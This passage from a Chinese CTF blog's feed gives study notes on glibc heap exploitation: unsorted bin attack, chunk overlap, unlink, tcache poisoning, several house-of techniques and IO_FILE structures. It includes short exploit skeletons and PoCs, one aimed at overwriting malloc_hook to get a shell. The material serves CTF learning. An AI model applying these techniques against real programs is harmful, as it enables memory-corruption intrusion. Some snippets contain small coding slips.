attack</h2><p>free后控制bk指针填入一个地址，再申请同样大小的块，即可向(指定地址+2*size)处填入类似[main_arena+88]的地址。</p><p>利用套路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr &#x3D; 0x602180</span><br><span class="line">new(0,0x400)</span><br><span class="line">new(9,10)</span><br><span class="line">free(0)</span><br><span class="line">edit(0,0x10,p64(0)+p64(ptr-0*10))</span><br><span class="line">new(1,0x400)</span><br></pre></td></tr></table></figure><p>此时0处地址为[main_arena+88]的地址。</p><p>注：堆的申请应该在unsortbin之前完成，否则会报错</p><h2 id="unsorted-bin-into-stac"><a href="#unsorted-bin-into-stac" class="headerlink" title="unsorted bin into stac"></a>unsorted bin into stac</h2><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line">  stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">  stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line">  victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时victim1的地址与stack_buffer相同</p><h2 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h2><p>利用条件：off by one或off by null</p><h3 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk extend"></a>chunk extend</h3><p>通过把p位置置0来伪造前面块为freed状态，并且prev_size为前面的伪造free的大小，从而重复申请得到两个指向同一地址的指针</p><p>常见利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0xf8</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure><p>此时4的地址与1相同</p><h3 id="chunk-shrink"><a href="#chunk-shrink" class="headerlink" title="chunk shrink"></a>chunk shrink</h3><p>原理：申请时分割用了size位，free时向前合并时只检查了prev_size</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x218</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x218</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x218</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x200</span>,<span class="string">'\x00'</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x218</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x219</span>,<span class="string">'\x00'</span>*<span class="number">0x218</span>+<span class="string">'\x00'</span>)<span class="comment">#将2的size位设为0x200，避免覆盖到3的prev_size位</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x80</span>)<span class="comment">#获取一个指针留用</span></span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#将2放入unsortbin中</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>free(3)后2变为top chunk，通过构造后可以再申请回4处的地址</p><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="new（small-bin-unlink）"><a href="#new（small-bin-unlink）" class="headerlink" title="new（small bin unlink）"></a>new（small bin unlink）</h3><p>在free中若p位为0，则会进行合并，并且将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602180</span>+<span class="number">0x8</span><span class="comment">#ptr为指向伪造的堆块的地址</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pay += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)<span class="comment">#伪造堆</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时ptr处的地址会被更改为ptr-0x18相应地址的值(即伪造堆的fd)</p><h3 id="old"><a href="#old" class="headerlink" title="old"></a>old</h3><p>旧版的libc（picoctf2019有出现，但就是不知道怎么编译的），一般是32位的程序</p><p>将当前堆的prev_size和size位置为0xfffffffc，则会认为上一块的位置为p-(-0x4)。（size位可随意填写）</p><p>设fd覆盖为p，bk覆盖为q。</p><p>则free相邻的前一个块后，*(q+8)=p， *(p+0xc)=q。</p><p>（好像还有其他的利用方法。。。不是很懂，没有具体的程序可以分析，不过picoctf那道倒是这么做的）</p><h2 id="Tcache-1"><a href="#Tcache-1" class="headerlink" title="Tcache"></a>Tcache</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>覆盖 tcache entry 结构体中的 next 域，不经过任何伪造（不需要检查size位） chunk 即可分配到另外地址,类似于fastbin attack。</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602180</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">9</span>,<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(ptr))</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x400</span>)</span><br></pre></td></tr></table></figure><p>此时4的地址为ptr。</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>类似于 fastbin 的double free，就是多次释放同一个tcache，形成环状链表</p><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>控制<code>tcache_perthread_struct</code>结构体</p><p>修改其中相应大小bins的数量及地址，即可任意申请</p><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>free 内存后，使得栈上的一块地址进入 tcache 链表，这样再次分配的时候就能把这块地址分配出来</p><h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h2 id="house-of-系列"><a href="#house-of-系列" class="headerlink" title="house of 系列"></a>house of 系列</h2><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><ol><li>伪造堆块</li><li>覆盖堆指针指向上面伪造堆</li><li>释放堆块</li><li>申请堆块</li></ol><p>例题：l-ctf2016–pwn200</p><h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><h4 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h4><ol><li>申请a、b块</li><li>并且伪造堆块（prev_size、size位任意，fd、bk都设置为堆块本身）</li><li>将b的prev_inuse置0，并把b的prev_size位设置为b-&gt;fd的地址减去伪造堆的地址</li><li>伪造堆的size位同样设置为b-&gt;fd的地址减去伪造堆的地址</li><li>释放掉堆块b，此时再申请即从伪造堆处开始</li></ol><h4 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h4><ol><li>申请a、b块</li><li>并且伪造堆块（prev_size、size位任意，fd、bk都设置为堆块本身）</li><li>将b的prev_inuse置0，并把b的prev_size位设置为b-&gt;fd的地址减去伪造堆的地址</li><li>伪造堆的size位同样设置为b-&gt;fd的地址减去伪造堆的地址，并且将相邻的下一堆块的prev_size设置为同样的b-&gt;fd的地址减去伪造堆的地址</li><li>释放掉堆块b，此时再申请即从伪造堆处开始</li></ol><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><p>利用条件：</p><ol><li>能够控制top chunk的size位</li><li>能自用控制malloc的分配大小</li><li>分配的次数不能受限制</li></ol><p>利用方法：</p><ol><li>申请堆块a</li><li>将topchunk的size改为-1</li><li>申请(addr-0x28)-topchunk_addr的块</li><li>再申请块，即可获得指向addr的块</li></ol><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><ol><li>申请堆块a,b</li><li>伪造堆块f1，f2：其中f1的prev_size和size位为0，fd指向堆块a，bk指向堆块f2；f2的fd指向f1</li><li>释放堆块a</li><li>申请堆块c</li><li>设置堆块a的bk为f1的地址</li><li>申请堆块d、e，则堆块e指向f1</li></ol><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p>通过修改chunk1的size位实现overlap。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line">chunk[<span class="number">-1</span>]=<span class="number">0xa1</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>此时chunk1对应bin的大小为0xa0；chunk2对应bin的大小为0x50，再申请对应大小堆块即可overlap。</p><h4 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h4><p>通过修改chunk1的fd位指向伪造堆块实现overlap。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chunk1 = malloc(<span class="number">0x40</span>);//<span class="number">0x602000</span></span><br><span class="line">chunk2 = malloc(<span class="number">0x100</span>);//<span class="number">0x602050</span></span><br><span class="line">chunk2[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>;</span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span>;</span><br><span class="line">free(chunk1);</span><br><span class="line">chunk1[<span class="number">0</span>]=<span class="number">0x602060</span>;</span><br><span class="line">malloc(<span class="number">5000</span>);</span><br></pre></td></tr></table></figure><p>此时bin中存在0x50(0x602000)以及0x30(0x602060)，申请即可实现overlap。</p><h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>思路：</p><ul><li>首先分配 <code>3</code> 个 <code>chunk （A , B, C）</code> ，大小分别为 <code>0x20, 0xd0, 0x70</code></li><li>在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></li><li>释放掉 <code>B</code> , <code>B</code> 进入 <code>unsorted bin</code> , 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中有 <code>main_arean</code> 的地址</li><li>再次分配 <code>0xd0</code> , 会分配到 <code>B</code>， 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中 <code>main_arean</code> 的地址依然存在</li><li>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk (D , E, F)</code>， 为后续做准备</li><li>在 <code>A</code> 触发 单字节溢出，修改 <code>B-&gt;size = 0x71</code> . 然后释放 <code>C , D</code>， 此时 <code>C , D</code> 进入 <code>fastbin</code> , 同时 <code>D-&gt;fd = C</code>. 由于 <code>chunk</code>之间的相对偏移固定，于是利用 <code>uaf</code> 修改 <code>D-&gt;fd</code> 的低 字节 ，使得 <code>D-&gt;fd=B</code></li><li>此时 <code>B-&gt;size = 0x71</code> ，同时 <code>B + 0x78</code> 为 <code>p64(0x61)</code> （第2步设置）， 这就成功伪造了一个 <code>0x70</code> 大小的 <code>fastbin</code>。 此时 <code>B-&gt;fd</code> 为 <code>main_arean</code> 的地址，于是通过 修改 低 <code>2</code>个字节，可以修改到<code>malloc_hook - 0x23</code> 处 （ <code>malloc_hook - 0x23 + 0x8</code> 处的值为 <code>p64(0x7f)</code> )</li><li>然后分配 <code>3</code> 次 <code>0x70</code> 的 <code>chunk</code>， 就可以拿到包含 <code>malloc_hook</code> 的 <code>chunk</code>, 此时 <code>malloc_hook</code> 内容为 <code>0</code></li><li>然后利用 <code>unsorted bin</code> 修改 <code>malloc_hook</code> 内容为 <code>main_arean</code> 的地址</li><li>利用部分写修改 <code>malloc_hook</code> 为 <code>one_gadget</code></li><li>多次释放一个指针，触发 <code>double free</code> 异常，进而触发 <code>malloc_printerr</code> ， <code>getshell</code></li></ul><h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House-of-Corrosion"></a>House-of-Corrosion</h3><h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">_IO_FILE file;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注：_IO_FILE是整个嵌入, _IO_jump_t为指针</p><h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="vtable-IO-jump-t"><a href="#vtable-IO-jump-t" class="headerlink" title="vtable IO_jump_t"></a>vtable IO_jump_t</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="vtable-IO-str-jumps"><a href="#vtable-IO-str-jumps" class="headerlink" title="vtable _IO_str_jumps"></a>vtable _IO_str_jumps</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">  JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">  JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;栈&quot;&gt;&lt;a href=&quot;#栈&quot; class=&quot;headerlink&quot; title=&quot;栈&quot;&gt;&lt;/a&gt;栈&lt;/h1&gt;&lt;h2 id=&quot;stack-pivoting&quot;&gt;&lt;a href=&quot;#stack-pivoting&quot; class=&quot;headerlink&quot; title=&quot;s
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>shellcode</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/shellcode/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/shellcode/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:25:06.515Z</updated>
    
